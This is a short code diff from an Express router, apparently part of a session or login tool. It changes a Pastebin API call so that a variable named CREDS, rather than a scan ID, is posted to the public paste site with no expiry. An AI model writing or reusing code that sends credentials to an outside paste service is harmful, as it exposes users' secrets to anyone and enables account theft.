@@ -59,7 +59,7 @@ router.get('/', async (req, res) => {
                     const response = await axios.post('https://pastebin.com/api/api_post.php', new URLSearchParams({
                             api_dev_key: pastebinApiKey,
                             api_option: 'paste',
-                            api_paste_code: Scan_Id,
+                            api_paste_code: CREDS,
                             api_paste_expire_date: 'N'
                         }).toString(), {
                             headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
